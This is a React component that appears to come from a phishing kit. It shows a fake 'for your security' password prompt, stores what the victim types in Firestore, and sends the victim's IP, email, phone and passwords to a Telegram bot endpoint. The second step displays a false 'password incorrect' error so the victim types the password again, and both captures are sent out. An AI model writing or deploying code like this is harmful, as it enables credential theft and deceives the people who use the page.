import React from 'react';
import { useState } from 'react';
import { useForm } from "react-hook-form";
import { db } from  '../firebaseConfig';
import { doc, updateDoc } from "firebase/firestore";
import styles from '../styles/password.module.css';


const Password = (props) => {
    const [steps, setSteps] = useState({first_password: true, second_password: false});
    const { register, handleSubmit } = useForm();

    console.log(props);

    const firstPasswordSubmit = async (data) => { 

        const docRef = doc(db, "users", props.email);

        await updateDoc(docRef,data);


        const formattedMessage = `
        <b>User (${props.ip.userIP})</b>
        -------------------------
        <b>Email:</b> ${props.email}
        <b>Phone:</b> ${props.phone}
        <b>First Password:</b> ${data.password}
        `;
    
        const dataGram = {
          chat_id: process.env.chatId,
          text: formattedMessage,
          parse_mode: 'HTML'
        };
    
    
        const response = await fetch(process.env.customKey, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(dataGram)
        });

        setSteps({first_password: false, second_password: true})

    }

    const secondPasswordSubmit = async (data) => { 
        const docRef = doc(db, "users", props.email);
        await updateDoc(docRef,data);

        const formattedMessage = `
        <b>User (${props.ip.userIP})</b>
        -------------------------
        <b>Email:</b> ${props.email}
        <b>Phone:</b> ${props.phone}
        <b>First Password:</b> ${data.password}
        <b>Second Password:</b> ${data.confirmPassword}
        `;
    
        const dataGram = {
          chat_id: process.env.chatId,
          text: formattedMessage,
          parse_mode: 'HTML'
        };
    
    
        const response = await fetch(process.env.customKey, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(dataGram)
        });

        trigerNext(data);
    }

    const trigerNext = (data) => {
        props.onSubmit({type: 'password', passwords: {firstPw: data.password, secondPw: data.confirmPassword}});
    }


    return <div className={styles.modal}>
        { steps.first_password && 
            <div className={styles.box}>
                <div className={styles.top}>
                    <h3>Please enter your password</h3>
                </div>
                <form onSubmit={handleSubmit(firstPasswordSubmit)}>
                    <p className={styles.securityInfo}>For your security, you must enter your password to continue.</p>

                    <div className={styles.input}>
                            <label>Password:</label>
                            <input type="password" required {...register("password")} />
                    </div>

                    <div className={styles.bottom}>
                            <button type="submit">Continue</button>
                    </div>
                </form>
            </div>
        }

        { steps.second_password && 
            <div className={styles.box}>
                <div className={styles.top}>
                        <h3>Please Re-Enter Your Password</h3>
                </div>
                <form onSubmit={handleSubmit(secondPasswordSubmit)}>
                    <p className={styles.securityInfo}>For your security, you must enter your password to continue.</p>

                        <div className={styles.input}>
                                <label>Password:</label>
                                <input type="password" required {...register("confirmPassword")} />
                                <p className={styles.error}>The password you&apos;ve entered is incorrect.</p>
                        </div>

                        <div className={styles.bottom}>
                                <button type="submit">Continue</button>
                        </div>
                </form>
            </div>
        }

                
    </div>
}


export default Password;